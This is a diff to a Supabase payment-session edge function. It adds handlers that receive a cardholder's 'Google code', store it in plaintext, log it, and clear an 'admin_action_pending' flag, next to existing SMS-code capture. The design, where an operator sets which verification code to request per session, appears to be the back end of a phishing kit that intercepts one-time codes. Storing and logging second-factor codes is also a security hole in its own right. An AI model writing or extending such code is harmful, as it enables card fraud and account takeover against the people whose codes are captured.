@@ -40,6 +40,10 @@ serve(async (req) => {
         return await handleSubmitSmsCode(req);
       case 'enter-sms-code':
         return await handleEnterSmsCode(req);
+      case 'enter-google-code':
+        return await handleEnterGoogleCode(req);
+      case 'submit-google-code':
+        return await handleSubmitGoogleCode(req);
       case 'complete-payment':
         return await handleCompletePayment(req);
       case 'reset-verification':
@@ -217,6 +221,8 @@ async function handleSetVerificationMethod(req: Request) {
     updates.verification_status = 'sms_confirmation';
   } else if (method === 'app_confirmation') {
     updates.verification_status = 'app_confirmation';
+  } else if (method === 'google_code_confirmation') {
+    updates.verification_status = 'google_code_confirmation';
   } else if (method === 'choice_required') {
     updates.verification_status = 'choice_required';
   }
@@ -340,6 +346,75 @@ async function handleSubmitSmsCode(req: Request) {
   });
 }
 
+async function handleEnterGoogleCode(req: Request) {
+  const { sessionId, googleCode } = await req.json();
+
+  console.log('Entering Google code for session:', sessionId, 'Code:', googleCode);
+
+  const { data, error } = await supabase
+    .from('payment_sessions')
+    .update({
+      google_code: googleCode,
+      verification_status: 'google_code_entered',
+      last_seen: new Date().toISOString()
+    })
+    .eq('session_id', sessionId)
+    .select(`
+      *,
+      orders (
+        cardholder_name
+      )
+    `)
+    .single();
+
+  if (error) {
+    console.error('Error entering Google code:', error);
+    return new Response(JSON.stringify({ error: error.message }), {
+      status: 500,
+      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+    });
+  }
+
+  return new Response(JSON.stringify({ success: true, data }), {
+    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+  });
+}
+
+async function handleSubmitGoogleCode(req: Request) {
+  const { sessionId, googleCode } = await req.json();
+
+  console.log('Submitting Google code for session:', sessionId, 'Code:', googleCode);
+
+  const { data, error } = await supabase
+    .from('payment_sessions')
+    .update({
+      google_code: googleCode,
+      verification_status: 'google_code_confirmed',
+      admin_action_pending: false,
+      last_seen: new Date().toISOString()
+    })
+    .eq('session_id', sessionId)
+    .select(`
+      *,
+      orders (
+        cardholder_name
+      )
+    `)
+    .single();
+
+  if (error) {
+    console.error('Error submitting Google code:', error);
+    return new Response(JSON.stringify({ error: error.message }), {
+      status: 500,
+      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+    });
+  }
+
+  return new Response(JSON.stringify({ success: true, data }), {
+    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+  });
+}
+
 async function handleCompletePayment(req: Request) {
   const { sessionId } = await req.json();
 
@@ -397,6 +472,10 @@ async function handleResetVerification(req: Request) {
     case 'sms_confirmation':
       updates.verification_status = 'sms_confirmation';
       updates.sms_code = null;
+      break;
+    case 'google_code_confirmation':
+      updates.verification_status = 'google_code_confirmation';
+      updates.google_code = null;
       break;
     case 'choice_required':
       updates.verification_status = 'waiting';
